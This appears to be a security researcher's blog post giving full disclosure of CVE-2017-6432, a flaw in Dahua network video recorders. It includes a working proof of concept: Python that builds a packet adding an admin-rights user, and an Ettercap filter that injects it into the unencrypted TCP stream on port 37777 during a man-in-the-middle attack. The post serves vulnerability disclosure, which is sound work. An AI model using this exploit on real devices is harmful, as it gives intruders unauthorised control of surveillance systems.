---
layout: post
title:  "Dahua NVR - Exploiting - CVE-2017-6432"
date:   2017-03-09 21:00:00 +1100
categories: exploit dahua
---

### Introduction

After discovering the Exposures identified [here](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)
I decided to try to inject a new user into the system by modifying packets in the TCP Stream

#### Disclosure Timeline
- 2017-02-24: Vulnerability Discovered
- 2017-03-02: Proof of Concept Written
- 2017-03-02: Dahua Contacted with plan to disclose on March 9th unless they wished otherwise.
- 2017-03-07: Dahua Responded with timeline to fix CVE-2017-6341, CVE-2017-6342, CVE-2017-6343
- 2017-03-07: Requested response for this: CVE-2017-6432 again
- 2017-03-09: Full Disclosure

### The Hardware and Software

- NVR Model: DHI-HCVR7216A-S3
- NVR Firmware: 3.210.0001.10 build: 2016-6-6
- Camera Firmware: 2.400.0000.28.R build 2016-3-29
- SmartPSS Software (v 1.16.1 Build Date 2017-01-19)
- gDSS Software for Android

### The method

When the Dahua Software (Mobile Phone application, or Desktop application, as identified above) connects to the NVR, it creates a TCP Connection to Socket 37777.  
This TCP Connection must be authorised before the NVR will respond.  
Without a valid authrorisation sending any data to this port, will cause the NVR to close the connection.  

As there is no encryption, any data transmitted over this connection is exposed to being read via a Man in the Middle attack, as identified in my previous report [here](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)

This in turn, makes this connection vulnerable to both packet manipulation and packet injection.

The Proof of Concept has been performed using Ettercap, an Ettercap Filter, and Ettercap to perform the Man in the Middle attack.  


### Proof of Concept


First, we need to generate the packet for a new user.
```python
newuser="null"
newpass="ku7"
content = "0:" + newuser + ":" + newpass + ":1:1::1"
length = chr(len(content))
payload = "\xa6\x00\x00\x00" + length + "\x00\x00\x00\x06" + "\x00"*23 + content
```
The :1:1::1 following the username and password is the groups and permissions, this is a basic account with admin rights, which can only modify configuration.  Whatever permissions and groups that are wanted, simply replace that.  
The 0: at the start is the user id.  A 0 causes the NVR to automatically assign the next free user ID to the new user.


![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.17.05 pm.png){:class="img-responsive"}


Now that we have our content, the following ettercap filter is used.  
What the packtet is I am detecting doesn't matter, as I am actually going to tack my payload (which is normally a full packet) straight onto the end of the original packet, and it will work just fine!  

```
if (ip.proto == TCP && tcp.dst == 37777 && DATA.data + 0 == "\xa4" && DATA.data + 8 == "\x1a" ){
    msg("Found One");
    inject("/root/etter/newuser.packet");
    exit();
}
```
![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.05.25 pm.png){:class="img-responsive"}

Now, Load this up into ettercap, do our magic, and have a peek at what happens

I hear you... That packet will be the wrong size, checksum won't match, the world will fall over.
You should drop or replace contents.  

![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.25.37 pm.png){:class="img-responsive"}

Yes, I should have to do something better than this... but I don't!

![img]({{ site.github.url }}/images/Screen Shot 2017-03-09 at 10.27.29 pm.png){:class="img-responsive"}

Originally I did so this by replacing the packet contents, as well as other ways.  As long as you inject into the stream, it will work

![img]({{ site.github.url }}/images/Screen Shot 2017-03-02 at 12.51.14 am.png){:class="img-responsive"}


### Additional Notes

While this proof of concept is only for injecting a user, it could be used for much more.


### Workarounds

There are none, this is insecure by design.  
Until proper encryption is used, these are vulnerable.  
If you intend to use any Dahua equipment on an untrusted network, they should be accessed only using an encrypted tunnel of some sort.  

### Vendor Response

Will update this when they do.  
7 days was given for a response, while correspondance did occur, this exploit was not covered.  
Due to the logical step from the last exposures to this one, Full Disclosure is applied.

### Credits

Vulnerability discovered by Andrew Frahn (null_ku7)

### References

CVE-2017-6341, CVE-2017-6342, CVE-2017-6343: [https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html](https://nullku7.github.io/stuff/exposure/dahua/2017/02/24/dahua-nvr.html)
